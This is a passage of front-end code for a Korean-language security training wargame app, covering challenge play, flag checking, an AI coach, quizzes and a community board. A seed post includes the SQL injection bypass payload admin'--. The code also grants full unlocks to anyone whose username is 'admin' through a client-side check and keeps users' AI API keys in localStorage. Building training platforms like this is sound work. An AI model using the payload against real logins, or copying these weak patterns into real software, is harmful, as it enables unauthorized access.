    try { return (localStorage.getItem('aegis_ai_provider') as 'gemini' | 'openai' | 'claude') || 'gemini'; } catch { return 'gemini'; }
  });
  const [aiApiKey, setAiApiKey] = useState<string>(() => {
    try { return localStorage.getItem('aegis_ai_key') || ''; } catch { return ''; }
  });
  const [aiCategory, setAiCategory] = useState<string>('SQL Injection');
  const [aiGenLoading, setAiGenLoading] = useState<boolean>(false);
  const [aiChallengeLibrary, setAiChallengeLibrary] = useState<ProblemItem[]>([]);
  const [aiLibraryLoading, setAiLibraryLoading] = useState<boolean>(false);
  const [aiGenError, setAiGenError] = useState<string>('');

  // Clear Screen Data
  const [clearRewardXp, setClearRewardXp] = useState<number>(0);
  const [clearRewardKind, setClearRewardKind] = useState<'first' | 'replay' | 'exhausted'>('first');
  const [clearTimeText, setClearTimeText] = useState<string>('00:00');

  // AI Coach Chat
  const [aiInput, setAiInput] = useState<string>('');
  const [aiMessages, setAiMessages] = useState<Message[]>([
    { role: 'ai', text: '안녕하십니까! 저는 실전 AI 보안 코치입니다. 입력값 검증과 신뢰 경계를 분석하며 질문해 주시면 힌트를 제공합니다.' }
  ]);

  // AI 질문하기 (일반 보안 Q&A, 특정 문제와 무관)
  const [aiHelpInput, setAiHelpInput] = useState<string>('');
  const [aiHelpMessages, setAiHelpMessages] = useState<Message[]>([
    { role: 'ai', text: '안녕하세요! 보안 관련 궁금한 점을 편하게 물어보세요. 어려운 용어도 최대한 쉽게 풀어서 설명해 드릴게요. 😊' }
  ]);
  const [aiHelpLoading, setAiHelpLoading] = useState<boolean>(false);

  // Arena Play: 문제(미션)와 AI 코치는 각각 별도로 열고 닫을 수 있는 창
  const [isMissionModalOpen, setIsMissionModalOpen] = useState<boolean>(true);
  const [isAiCoachOpen, setIsAiCoachOpen] = useState<boolean>(false);

  // 오답 노트: FLAG를 틀린 문제 id 기록 (로컬 전용)
  const [wrongProblemIds, setWrongProblemIds] = useState<string[]>(() => {
    try { return JSON.parse(localStorage.getItem('aegis_wrong_ids') || '[]'); } catch { return []; }
  });
  const [debriefCategoryFilter, setDebriefCategoryFilter] = useState<string>('ALL');

  // 스피드 퀴즈 (말해보카 느낌의 빠른 문제 풀기)
  const [quizStatus, setQuizStatus] = useState<'idle' | 'playing' | 'result'>('idle');
  const [quizQueue, setQuizQueue] = useState<ProblemItem[]>([]);
  const [quizIndex, setQuizIndex] = useState<number>(0);
  const [quizInput, setQuizInput] = useState<string>('');
  const [quizFeedback, setQuizFeedback] = useState<'idle' | 'correct' | 'wrong'>('idle');
  const [quizScore, setQuizScore] = useState<number>(0);
  const [quizCombo, setQuizCombo] = useState<number>(0);
  const [quizMaxCombo, setQuizMaxCombo] = useState<number>(0);
  const [quizTimeLeft, setQuizTimeLeft] = useState<number>(15);
  const [quizEarnedXp, setQuizEarnedXp] = useState<number>(0);

  // Strategy Guide Tab
  const [activeGuideTab, setActiveGuideTab] = useState<string>('sql');

  // Community Board
  const [selectedPostId, setSelectedPostId] = useState<number | null>(null);
  const [isPostComposeOpen, setIsPostComposeOpen] = useState<boolean>(false);
  const [communitySearch, setCommunitySearch] = useState<string>('');
  const [communityTab, setCommunityTab] = useState<'problem' | 'free' | 'best'>('free');
  const [composeCategory, setComposeCategory] = useState<'problem' | 'free'>('free');
  const [postComments, setPostComments] = useState<PostComment[]>([]);
  const [commentInput, setCommentInput] = useState<string>('');
  const [likedPostIds, setLikedPostIds] = useState<number[]>(() => {
    try { return JSON.parse(localStorage.getItem('aegis_liked_posts') || '[]'); } catch { return []; }
  });

  const [posts, setPosts] = useState<CommunityPost[]>(() => {
    try {
      const saved = localStorage.getItem('aegis_community_posts');
      if (saved) return JSON.parse(saved);
    } catch {}
    return [
      { id: 1, title: '[암호화 통신] SQL Injection 인증 우회 팁 공유', content: "admin'-- 페이로드 뒤에 공백이나 주석 처리를 정확히 해야 MySQL 파서에서 인식됩니다.", author: 'root_operator', created_at: '방금 전', likes: 14 },
      { id: 2, title: '[보안 권고] XSS 방어 시 innerHTML 금지', content: "사용자 입력을 렌더링할 때는 반드시 textContent나 DOMPurify, 또는 프레임워크 자동 이스케이프를 사용해야 안전합니다.", author: 'shield_guardian', created_at: '10분 전', likes: 9 },
      { id: 3, title: '[작전 공유] Prepared Statement 파라미터 바인딩', content: "쿼리 구조와 데이터를 분리하는 것이 SQLi의 완벽한 1차 방어선입니다.", author: 'cyber_auditor', created_at: '1시간 전', likes: 21 },
    ];
  });
  const [postTitleInput, setPostTitleInput] = useState<string>('');
  const [postContentInput, setPostContentInput] = useState<string>('');

  // Login Modal State
  const [loginId, setLoginId] = useState<string>('');
  const [loginPw, setLoginPw] = useState<string>('');
  const [loginMode, setLoginMode] = useState<'login' | 'register'>('login');

  // Refs for Auto-Scroll
  const logEndRef = useRef<HTMLDivElement>(null);
  const chatEndRef = useRef<HTMLDivElement>(null);

  // 튜토리얼 워크스루가 실제 화면 요소를 스크롤/스포트라이트 강조할 때 사용하는 refs
  const briefingScenarioRef = useRef<HTMLDivElement>(null);
  const briefingCodeRef = useRef<HTMLDivElement>(null);
  const terminalInputRowRef = useRef<HTMLDivElement>(null);
  const missionBriefingBtnRef = useRef<HTMLButtonElement>(null);
  const aiCoachBtnRef = useRef<HTMLButtonElement>(null);

  // Admin Account: username "admin" gets every challenge marked cleared and every title unlocked
  const isAdminAccount = username.trim().toLowerCase() === 'admin';
  const effectiveSolvedIds = isAdminAccount ? masterProblemDB.map((p) => p.id) : solvedProblemIds;

  // Level Info calculations
  const { level: userLevel, currentExp, requiredExp } = getLevelInfo(totalExp);
  const levelExpPercent = Math.min(100, (currentExp / requiredExp) * 100);
  const isMaxXp = totalExp >= MAX_TOTAL_XP;
  const userLevelTier = getDeveloperLevelTier(userLevel);
  const userLevelTierMeta = getDeveloperLevelTierMeta(userLevelTier);
  const currentLevelTierIndex = Math.max(0, developerLevelTiers.findIndex((tier) => tier.name === userLevelTier));
  const hackerTierUnlocked = isAdminAccount || currentLevelTierIndex >= developerLevelTiers.length - 1;

  // Sync to LocalStorage
  useEffect(() => {
    try {
      localStorage.setItem('aegis_total_xp', totalExp.toString());
      localStorage.setItem('aegis_solved_ids', JSON.stringify(solvedProblemIds));
      localStorage.setItem('aegis_tactical_mastery', JSON.stringify(tacticalMastery));
      localStorage.setItem('aegis_community_posts', JSON.stringify(posts));
      localStorage.setItem('aegis_wrong_ids', JSON.stringify(wrongProblemIds));
      localStorage.setItem('aegis_liked_posts', JSON.stringify(likedPostIds));
      localStorage.setItem('aegis_replay_counts', JSON.stringify(replayCounts));
    } catch {}
  }, [totalExp, solvedProblemIds, tacticalMastery, posts, wrongProblemIds, likedPostIds, replayCounts]);

  // Hydrate profile from Neon DB when logged in (authToken present)
  useEffect(() => {
    if (!authToken) return;
    authApi.me(authToken).then(({ user }) => {
      setUsername(user.username);
      setTotalExp(user.points);
      setSolvedProblemIds(user.solvedIds);
      setTacticalMastery((prev) => ({ ...prev, ...user.tacticalMastery }));
    }).catch(() => {
      // Token expired or invalid - kick back to the login gate
      try { localStorage.removeItem('aegis_token'); } catch {}
      setAuthToken(null);
      setIsLoggedIn(false);
      setCurrentView('login');
    });
  }, [authToken]);

  // Access gate: only landing/login/tutorial screens are reachable while logged out
  useEffect(() => {
    const publicViews: ViewState[] = ['landing', 'login', 'beginner_basics', 'tutorial_intro'];
    if (!isLoggedIn && !publicViews.includes(currentView)) {
      setCurrentView('login');
    }
  }, [isLoggedIn, currentView]);

  // Persist progress to Neon DB whenever it changes, if logged in
  useEffect(() => {
    if (!authToken) return;
    const timer = setTimeout(() => {
      authApi.sync(authToken, { points: totalExp, solvedIds: solvedProblemIds, tacticalMastery }).catch(() => {});
    }, 800);
    return () => clearTimeout(timer);
  }, [authToken, totalExp, solvedProblemIds, tacticalMastery]);

  // Load community posts from Neon DB
  useEffect(() => {
    authApi.getPosts().then(({ posts: serverPosts }) => {
      if (serverPosts && serverPosts.length > 0) setPosts(serverPosts);
    }).catch(() => {});
  }, []);

  // AI 심화 모드: 사용자가 입력한 API 키/제공자를 이 기기에만 저장
  useEffect(() => {
    try {
      localStorage.setItem('aegis_ai_key', aiApiKey);
      localStorage.setItem('aegis_ai_provider', aiProvider);
    } catch {}
  }, [aiApiKey, aiProvider]);

  // Load global rankings when the Rankings view is opened
  useEffect(() => {
    if (currentView !== 'rankings') return;
    setRankingsLoading(true);
    authApi.rankings()
      .then(({ rankings }) => setRankingsList(rankings))
      .catch(() => setRankingsList([]))
      .finally(() => setRankingsLoading(false));
  }, [currentView]);

  // 심화 풀이 모드 진입 시 다른 사용자들이 만든 AI 문제 보관함 불러오기
  useEffect(() => {
    if (currentView !== 'aichallenge') return;
    loadAiChallengeLibrary();
  }, [currentView]);

  // Title Vault Items
  const levelTitleItems = [
    ...developerLevelTiers.map((tier, index) => {
      const meta = getDeveloperLevelTierMeta(tier.name);
      const unlocked = isAdminAccount || index <= currentLevelTierIndex;
      return {
        id: `level-${tier.name}`,
        name: tier.name,
        range: tier.range,
        meta,
        unlocked,
        color: meta.color,
        iconType: meta.iconType,
        rarityScore: index,
        kind: 'level' as const,
      };
    }),
    ...hackerSubTitles.map((subName, subIndex) => {
      const meta = getDeveloperLevelTierMeta(subName);
      const unlocked = isAdminAccount || hackerTierUnlocked;
      return {
        id: `level-${subName}`,
        name: subName,
        range: '해커 선택 칭호',
        meta,
        unlocked,
        color: meta.color,
        iconType: meta.iconType,
        rarityScore: developerLevelTiers.length + subIndex,
        kind: 'level' as const,
      };
    }),
  ];

  const masteryTitleItems = categories.flatMap((cat) => [1, 2, 3, 4, 5].map((tier) => {
    const mastery = tacticalMastery[cat.id] ?? { tier: 0, progress: 0 };
    const unlocked = isAdminAccount || mastery.tier >= tier;
    const color = getTierTextColor(tier);
    return {
      id: `mastery-${cat.id}-${tier}`,
      categoryName: cat.name,
      name: `${cat.name} T${tier}`,
      icon: cat.icon,
      tier,
      unlocked,
      color,
      currentTier: mastery.tier,
      rarityScore: tier,
      kind: 'mastery' as const,
    };
  }));

  const unlockedTitleItems = [...levelTitleItems, ...masteryTitleItems].filter((item) => item.unlocked);
  const selectedProfileTitle = unlockedTitleItems.find((item) => item.id === selectedTitleId) ?? levelTitleItems[currentLevelTierIndex] ?? levelTitleItems[0];

  // Glitch effect on landing
  useEffect(() => {
    let timer: number;
    const schedule = () => {
      timer = window.setTimeout(() => {
        setIsLandingGlitching(true);
        window.setTimeout(() => {
          setIsLandingGlitching(false);
          schedule();
        }, 1000);
      }, 10000 + Math.random() * 5000);
    };
    schedule();
    return () => clearTimeout(timer);
  }, []);

  // Timer updater for arena_play
  useEffect(() => {
    if (currentView !== 'arena_play') return;
    const timer = setInterval(() => {
      const elapsed = Math.max(0, Math.floor((Date.now() - operationStartedAt) / 1000));
      const m = Math.floor(elapsed / 60).toString().padStart(2, '0');
      const s = (elapsed % 60).toString().padStart(2, '0');
      setOperationElapsedTimeText(`${m}:${s}`);
    }, 1000);
    return () => clearInterval(timer);
  }, [currentView, operationStartedAt]);

  useEffect(() => { logEndRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [terminalLogs]);
  useEffect(() => { chatEndRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [aiMessages]);

  // Start Playing a Problem
  const handleLogout = () => {
    if (authToken) {
      try { localStorage.removeItem('aegis_token'); } catch {}
      setAuthToken(null);
    }
    setLoginId(''); setLoginPw(''); setAuthError('');
    setIsLoggedIn(false);
    setCurrentView('login');
  };

  const handleDeleteAccount = async () => {
    if (!authToken) return;
    if (!deleteAccountPassword.trim()) {
      setDeleteAccountError('비밀번호를 입력해주세요.');
      return;
    }
    setDeleteAccountLoading(true);
    setDeleteAccountError('');
    try {
      await authApi.deleteAccount(authToken, deleteAccountPassword);
      try { localStorage.removeItem('aegis_token'); } catch {}
      setIsDeleteAccountOpen(false);
      setDeleteAccountPassword('');
      handleLogout();
    } catch (err) {
      setDeleteAccountError(err instanceof Error ? err.message : '계정 삭제 중 오류가 발생했습니다.');
    } finally {
      setDeleteAccountLoading(false);
    }
  };

  const startProblemSession = (problem: ProblemItem) => {
    setCurrentProblem(problem);
    setPayloadInput('');
    setFlagInput('');
    setIsSuccess(false);
    setShowHint(false);
    setHintsUsed(0);
    setTerminalLogs([
      { type: 'info', text: `[AEGIS-SANDBOX v3.0] 연결 수립: ${problem.title}` },
      { type: 'info', text: `카테고리: ${problem.category} | 작전 모드: ${problem.role} | 난이도: ${problem.level}` },
      { type: 'warning', text: '입력창에 페이로드 또는 시큐어 패치 코드를 입력하여 터미널을 테스트하세요.' }
    ]);
    setAiMessages([
      { role: 'ai', text: `안녕하세요! "${problem.title}" 실습을 시작합니다. 코드의 신뢰 경계를 분석하고 의문점이 있으면 질문해주세요.` }
    ]);
    setIsMissionModalOpen(true);
    setIsAiCoachOpen(false);
    setOperationStartedAt(Date.now());
    setOperationElapsedTimeText('00:00');
    setCurrentView('arena_play');
    setBriefingStep(0);
    setBriefingGuideDone(false);
  };

  // briefingStep이 바뀔 때마다 해당 구역이 보이도록 미션 브리핑을 자동으로 열고닫고, 그 자리로 스크롤함.
  // (별도 팝업 창을 만드는 대신, 실제 미션 브리핑/터미널/버튼 자체를 단계에 맞춰 그대로 사용함)
  useEffect(() => {
    if (levelTierOf(currentProblem) !== 1 || briefingGuideDone) return;
    const targets = ['scenario', 'input', 'code', 'help'] as const;
    const target = targets[briefingStep];
    setIsMissionModalOpen(target === 'scenario' || target === 'code');

    const timer = setTimeout(() => {
      if (target === 'scenario') briefingScenarioRef.current?.scrollIntoView({ behavior: 'smooth', block: 'start' });
      else if (target === 'code') briefingCodeRef.current?.scrollIntoView({ behavior: 'smooth', block: 'start' });
      else if (target === 'input') terminalInputRowRef.current?.scrollIntoView({ behavior: 'smooth', block: 'center' });
      else if (target === 'help') missionBriefingBtnRef.current?.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }, 120);

    return () => clearTimeout(timer);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [briefingStep, briefingGuideDone, currentProblem.id]);

  // 실전 풀이 모드: 카테고리를 섞어 연속으로 도전하는 챌린지 런 (최대 9개)
  const startRealPracticeRun = () => {
    const rank: Record<string, number> = { Hard: 3, Medium: 2, Easy: 1, Tutorial: 0 };
    const perCategoryPick: ProblemItem[] = [];
    categories.forEach((cat) => {
      const pool = masterProblemDB.filter((p) => p.category === cat.name);
      if (pool.length === 0) return;
      // 카테고리에서 가장 어려운 난이도의 문제가 여러 개면 그중 무작위로 하나를 뽑음
      // (예전엔 항상 배열의 첫 번째 문제만 뽑혀서 실전 풀이 모드가 매번 똑같았음)
      const maxRank = Math.max(...pool.map((p) => rank[p.level] ?? 0));
      const topTier = pool.filter((p) => (rank[p.level] ?? 0) === maxRank);
      perCategoryPick.push(topTier[Math.floor(Math.random() * topTier.length)]);
    });

    let queue = [...perCategoryPick].sort(() => Math.random() - 0.5);
    if (queue.length < 9) {
      const usedIds = new Set(queue.map((p) => p.id));
      const extra = masterProblemDB.filter((p) => !usedIds.has(p.id)).sort(() => Math.random() - 0.5).slice(0, 9 - queue.length);
      queue = [...queue, ...extra];
    }
    queue = queue.slice(0, 9);

    setIsRunMode(true);
    setRunQueue(queue);
    setRunIndex(0);
    startProblemSession(queue[0]);
  };

  const advanceRun = () => {
    const nextIndex = runIndex + 1;
    if (nextIndex < runQueue.length) {
      setRunIndex(nextIndex);
      startProblemSession(runQueue[nextIndex]);
    } else {
      setIsRunMode(false);
      setWargameStage('hub');
      setCurrentView('wargames');
    }
  };

  const cancelRun = () => {
    setIsRunMode(false);
    setRunQueue([]);
    setRunIndex(0);
    setWargameStage('hub');
    setCurrentView('wargames');
  };

  const exitArenaPlay = () => {
    if (isRunMode) {
      cancelRun();
    } else {
      setWargameStage('hub');
      setCurrentView('wargames');
    }
  };

  // 심화 풀이 모드: 사용자가 입력한 AI API 키로 새 고급 문제를 즉석 생성하고 DB에 저장해 다른 사용자와 공유
  const generateAiChallenge = async () => {
    if (!aiApiKey.trim()) {
      setAiGenError('AI API 키를 입력해주세요.');
      return;
    }
    setAiGenLoading(true);
    setAiGenError('');
    try {
      const res = await fetch('/api/ai-challenge', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ category: aiCategory, provider: aiProvider, apiKey: aiApiKey.trim(), author: username }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'AI 문제 생성에 실패했습니다.');
      const problem = { ...data.problem, id: String(data.problem.id) } as ProblemItem;
      startProblemSession(problem);
    } catch (err) {
      setAiGenError(err instanceof Error ? err.message : 'AI 문제 생성 중 오류가 발생했습니다.');
    } finally {
      setAiGenLoading(false);
    }
  };

  const loadAiChallengeLibrary = async () => {
    setAiLibraryLoading(true);
    try {
      const res = await fetch('/api/ai-challenge');
      const data = await res.json();
      const list = (data.challenges || []).map((c: any) => ({ ...c, id: String(c.id) })) as ProblemItem[];
      setAiChallengeLibrary(list);
    } catch {
      setAiChallengeLibrary([]);
    } finally {
      setAiLibraryLoading(false);
    }
  };

  // Terminal Payload Execution Engine (초보자 친화적 유연한 검증 및 격려 안내)
  const executePayload = () => {
    if (!payloadInput.trim()) return;
    const input = payloadInput.trim();
    setTerminalLogs(prev => [...prev, { type: 'info', text: `operator@target:~$ ${input}` }]);

    setTimeout(() => {
      // 초보자가 사소한 따옴표(' vs "), 세미콜론(;), 다중 공백으로 좌절하지 않도록 정규화 비교
      const normalize = (s: string) =>
        s.trim().toLowerCase()
          .replace(/;+$/, '')
          .replace(/["'`]/g, "'")
          .replace(/\s+/g, ' ')
          .replace(/\s*([()=,+*#<>])\s*/g, '$1')
          .trim();

      const expected = currentProblem.answer.trim();
      const isMatch = (input.toLowerCase() === expected.toLowerCase()) || 
                      (normalize(input) === normalize(expected));

      if (isMatch) {
        const isLevelOne = levelTierOf(currentProblem) === 1;
        setTerminalLogs(prev => [
          ...prev,
          { type: 'success', text: isLevelOne ? `[정답입니다!] 입력한 값이 문제의 조건과 정확히 일치합니다. 잠시 후 완료 화면으로 이동합니다.` : `[SUCCESS] 축하합니다! 대상 프로세스 취약점 검증 및 통과 성공!` },
          ...(isLevelOne ? [{ type: 'info' as const, text: `💡 방금 입력이 왜 동작했는지는 미션 브리핑의 상황 설명과 코드를 다시 보면 확인할 수 있어요.` }] : [
            { type: 'success' as const, text: `FLAG: ${currentProblem.flag}` },
            { type: 'info' as const, text: `👉 위 FLAG를 아래 'FLAG:' 입력창에 그대로 복사(또는 입력)한 뒤 [SUBMIT]을 누르면 미션 완료!` }
          ])
        ]);
        setIsSuccess(true);
        if (isLevelOne) setTimeout(() => submitFlag(true), 5500);
      } else {
        const isBeginnerLevel = currentProblem.level === 'Tutorial' || currentProblem.level === 'Easy' || levelTierOf(currentProblem) === 1;
        setTerminalLogs(prev => [
          ...prev,
          { type: 'error', text: `[ERROR] 페이로드 실행 결과 실패: 입력값이 시스템 조건과 일치하지 않습니다.` },
          { 
            type: 'warning', 
            text: isBeginnerLevel 
              ? `💡 초보자 안내: 어려우신가요? 좌측 하단의 [📋 미션 브리핑 열기] → [💡 막히면 힌트 보기]를 누르면 입력할 정답과 쉬운 설명이 바로 나와요!` 
              : `💡 힌트: 문제 설명의 작성 양식을 다시 점검해 보세요.` 
          }
        ]);
      }
    }, 300);

    setPayloadInput('');
  };

  // Submit Flag Engine
  const submitFlag = (directComplete = false) => {
    if (!directComplete && !flagInput.trim()) {
      alert('FLAG를 입력해주세요.');
      return;
    }

    if (directComplete || flagInput.trim() === currentProblem.flag) {
      const isAlreadySolved = solvedProblemIds.includes(currentProblem.id);
      // 이미 클리어한 문제는 재풀이당 20% XP를 최대 3번까지만 지급 (그 이후로는 0) — 무한 파밍 방지
      const priorReplays = replayCounts[currentProblem.id] || 0;
      const replayRewardEligible = isAlreadySolved && priorReplays < 3;
      const earnedXp = !isAlreadySolved
        ? currentProblem.xp
        : replayRewardEligible
          ? Math.floor(currentProblem.xp * 0.2)
          : 0;

      setClearRewardXp(earnedXp);
      setClearRewardKind(!isAlreadySolved ? 'first' : replayRewardEligible ? 'replay' : 'exhausted');
      setClearTimeText(operationElapsedTimeText);
      if (earnedXp > 0) {
        setTotalExp(prev => prev + earnedXp);
      }
      if (replayRewardEligible) {
        setReplayCounts(prev => ({ ...prev, [currentProblem.id]: priorReplays + 1 }));
      }

      if (!isAlreadySolved) {
        setSolvedProblemIds(prev => [...prev, currentProblem.id]);

        // Mastery Progress — 최초 클리어 시에만 적립
        const catId = categories.find(c => c.name.toLowerCase().includes(currentProblem.category.toLowerCase().split(' ')[0]))?.id || 'sql';
        setTacticalMastery(prev => {
          const curr = prev[catId] ?? { tier: 0, progress: 0 };
          if (curr.tier >= 5) return prev;
          let nTier = curr.tier;
          let nProg = curr.progress + 25;
          while (nTier < 5 && nProg >= getTierRequirement(nTier)) {
            nProg -= getTierRequirement(nTier);
            nTier += 1;
          }
          return { ...prev, [catId]: { tier: nTier, progress: nTier >= 5 ? 0 : nProg } };
        });
      }

      setCurrentView('arena_clear');
    } else {
      setWrongProblemIds(prev => prev.includes(currentProblem.id) ? prev : [...prev, currentProblem.id]);
      alert('❌ 유효하지 않은 FLAG입니다. 터미널 출력을 확인하세요.');
    }
  };

  // Send AI Coach Message
  const sendAiMessage = async (textToSend?: string) => {
    const query = textToSend || aiInput;
    if (!query.trim()) return;

    setAiMessages(prev => [...prev, { role: 'user', text: query }]);
    setAiInput('');

    try {
      const res = await fetch('/api/coach', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          mode: 'challenge',
          challengeTitle: currentProblem.title,
          category: currentProblem.category,
          userMessage: query,
          codeContext: currentProblem.code
        })
      });
      if (res.ok) {
        const data = await res.json();
        setAiMessages(prev => [...prev, { role: 'ai', text: data.reply }]);
        return;
      }
    } catch {}

    // Heuristic fallback
    setTimeout(() => {
      setAiMessages(prev => [
        ...prev,
        { role: 'ai', text: `[AI 코치 조언] "${query}"에 관하여: ${currentProblem.hint} 소스코드의 입출력 경계를 주의 깊게 살펴보세요.` }
      ]);
    }, 400);
  };

  // AI 질문하기: 특정 문제와 무관한 일반 보안 Q&A (정답 유출 걱정 없이 자유롭게 설명)
  const sendAiHelpMessage = async (textToSend?: string) => {
    const query = textToSend || aiHelpInput;
    if (!query.trim()) return;

    setAiHelpMessages(prev => [...prev, { role: 'user', text: query }]);
    setAiHelpInput('');
    setAiHelpLoading(true);

    try {
      const res = await fetch('/api/coach', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mode: 'general', userMessage: query }),
      });
      const data = await res.json();
      setAiHelpMessages(prev => [...prev, { role: 'ai', text: data.reply || 'AI 응답을 받아오지 못했어요. 다시 시도해 주세요.' }]);
    } catch {
      setAiHelpMessages(prev => [...prev, { role: 'ai', text: '지금은 AI에게 연결할 수 없어요. 잠시 후 다시 시도해 주세요.' }]);
    } finally {
      setAiHelpLoading(false);
    }
  };

  // ==========================================
  // 복습 (풀었던 문제 기반 기출 변형 드릴)
  // ==========================================
  const quizLevelRank: Record<string, number> = { Tutorial: 0, Easy: 1, Medium: 2, Hard: 3 };

  const startSpeedQuiz = () => {
    const solvedSet = new Set(effectiveSolvedIds);
    let pool = masterProblemDB.filter((p) => solvedSet.has(p.id));

    // 사용자의 현재 레벨에 맞는 난이도를 우선 선정 (기출 변형: 이미 풀었던 문제를 현재 실력에 맞게 다시 출제)
    const targetRank = userLevel >= 60 ? 3 : userLevel >= 30 ? 2 : userLevel >= 10 ? 1 : 0;
    pool = [...pool].sort((a, b) => {
      const da = Math.abs((quizLevelRank[a.level] ?? 1) - targetRank);
      const db = Math.abs((quizLevelRank[b.level] ?? 1) - targetRank);
      return da - db;
    });

    // 상위 후보군 안에서 랜덤 셔플 (같은 세트가 매번 반복되지 않도록)
    let selected = [...pool.slice(0, 20)].sort(() => Math.random() - 0.5).slice(0, 8);

    if (selected.length === 0) {
      // 아직 푼 문제가 없다면 튜토리얼 문제로 대체
      selected = [...masterProblemDB.filter((p) => p.level === 'Tutorial')].sort(() => Math.random() - 0.5).slice(0, 8);
    }

    setQuizQueue(selected);
    setQuizIndex(0);
    setQuizInput('');
    setQuizFeedback('idle');
    setQuizScore(0);
    setQuizCombo(0);
    setQuizMaxCombo(0);
    setQuizTimeLeft(15);
    setQuizStatus('playing');
  };

  const cancelSpeedQuiz = () => {
    setQuizStatus('idle');
    setQuizQueue([]);
    setQuizIndex(0);
    setQuizInput('');
    setQuizFeedback('idle');
  };

  const advanceQuiz = () => {
    setQuizInput('');
    setQuizFeedback('idle');
    setQuizIndex(prev => {
      const next = prev + 1;
      if (next >= quizQueue.length) {
        setQuizStatus('result');
        return prev;
      }
      setQuizTimeLeft(15);
      return next;
    });
  };

  const submitQuizAnswer = () => {
    if (quizFeedback !== 'idle') return;
    const current = quizQueue[quizIndex];
    if (!current) return;
    const expected = current.answer.trim().toLowerCase();
    const isCorrect = quizInput.trim().toLowerCase() === expected;

    if (isCorrect) {
      const newCombo = quizCombo + 1;
      setQuizCombo(newCombo);
      setQuizMaxCombo(prev => Math.max(prev, newCombo));
      setQuizScore(prev => prev + 10 + newCombo * 2);
      setQuizFeedback('correct');
    } else {
      setQuizCombo(0);
      setQuizFeedback('wrong');
    }
    setTimeout(advanceQuiz, 1100);
  };

  // Quiz per-question countdown timer
  useEffect(() => {
    if (quizStatus !== 'playing' || quizFeedback !== 'idle') return;
    if (quizTimeLeft <= 0) {
      setQuizCombo(0);
      setQuizFeedback('wrong');
      setTimeout(advanceQuiz, 1100);
      return;
    }
    const timer = setTimeout(() => setQuizTimeLeft(t => t - 1), 1000);
    return () => clearTimeout(timer);
  }, [quizStatus, quizFeedback, quizTimeLeft]);

  // 복습 중 다른 탭으로 이동하면 진행 중이던 드릴을 취소해 타이머가 뒤에서 계속 흐르지 않게 함
  useEffect(() => {
    if (quizStatus === 'playing' && currentView !== 'speedquiz') {
      setQuizStatus('idle');
      setQuizQueue([]);
    }
  }, [currentView]);

  // Award XP once results screen is shown
  useEffect(() => {
    if (quizStatus !== 'result') return;
    const xp = quizScore;
    setQuizEarnedXp(xp);
    if (xp > 0) setTotalExp(prev => prev + xp);
  }, [quizStatus]);

  // Send Community Post
  const handleCreatePost = async () => {
    if (!postTitleInput.trim() || !postContentInput.trim()) {
      alert('통신 제목과 내용을 모두 입력해주세요.');
      return;
    }

    const localPost: CommunityPost = {
      id: Date.now(),
      title: postTitleInput.trim(),
      content: postContentInput.trim(),
      author: username,
      created_at: '방금 전',
      likes: 0,
      category: composeCategory,
    };

    setPosts(prev => [localPost, ...prev]);
    setPostTitleInput('');
    setPostContentInput('');

    try {
      const { post } = await authApi.createPost({ title: localPost.title, content: localPost.content, author: username, category: composeCategory });
      setPosts(prev => prev.map(p => (p.id === localPost.id ? post : p)));
    } catch {}
  };

  const handleToggleLike = async (postId: number) => {
    if (likedPostIds.includes(postId)) return;
    setLikedPostIds(prev => [...prev, postId]);
    setPosts(prev => prev.map(p => (p.id === postId ? { ...p, likes: p.likes + 1 } : p)));
    try { await authApi.likePost(postId); } catch {}
  };

  const handleOpenPost = async (postId: number) => {
    setSelectedPostId(postId);
    setPostComments([]);
    try {
      const { comments } = await authApi.getComments(postId);
      setPostComments(comments);
    } catch {}
  };

  const handleAddComment = async (postId: number) => {
    if (!commentInput.trim()) return;
    const content = commentInput.trim();
    setCommentInput('');
    try {
      const { comment } = await authApi.addComment(postId, { author: username, content });
      setPostComments(prev => [...prev, comment]);
    } catch {}
  };

  // Top Nav Bar
  const navItemStyle = (active: boolean): React.CSSProperties => ({
    cursor: 'pointer',
    whiteSpace: 'nowrap',
    flexShrink: 0,
    color: active ? '#00f2fe' : '#94a3b8',
    textShadow: active ? '0 0 10px #00f2fe' : 'none',
  });

  const TopBar = () => (
    <nav style={{ display: 'flex', justifyContent: 'space-between', padding: '14px 24px', backgroundColor: '#030611', borderBottom: '1px solid rgba(0, 242, 254, 0.35)', alignItems: 'center', zIndex: 10, gap: '16px' }}>
      <div onClick={() => setCurrentView('landing')} style={{ display: 'flex', alignItems: 'center', fontWeight: '900', fontSize: '20px', cursor: 'pointer', letterSpacing: '1px', flexShrink: 0, whiteSpace: 'nowrap' }}>
        <span style={{ color: '#fff', marginRight: '4px' }}>AEGIS</span>
        <span className="neon-hack-text">CYBER</span>
        <span style={{ color: '#00f2fe', marginLeft: '4px' }}>ARENA</span>
      </div>

      <div className="topbar-scroll" style={{ display: 'flex', alignItems: 'center', gap: '18px', fontSize: '12.5px', fontWeight: 'bold', overflowX: 'auto', flex: '1 1 auto', minWidth: 0 }}>
        <span onClick={() => setCurrentView('main')} style={navItemStyle(currentView === 'main')}>HOME</span>
        <span onClick={() => { setWargameStage('hub'); setCurrentView('wargames'); }} style={navItemStyle(['wargames', 'arena_play', 'arena_clear'].includes(currentView))}>WARGAMES</span>
        <span onClick={() => setCurrentView('debrief')} style={navItemStyle(currentView === 'debrief')}>📓 오답노트</span>
        <span onClick={() => setCurrentView('speedquiz')} style={navItemStyle(currentView === 'speedquiz')}>🔁 복습</span>
        <span onClick={() => setCurrentView('community')} style={navItemStyle(currentView === 'community')}>커뮤니티</span>
        <span onClick={() => setCurrentView('ai_help')} style={navItemStyle(currentView === 'ai_help')}>🤖 AI 질문</span>
        <span onClick={() => setCurrentView('rankings')} style={navItemStyle(currentView === 'rankings')}>RANKINGS</span>
        <span onClick={() => setCurrentView('titles')} style={navItemStyle(currentView === 'titles')}>칭호</span>
        <span onClick={() => setCurrentView('guide')} style={navItemStyle(currentView === 'guide')}>📄 공략집</span>
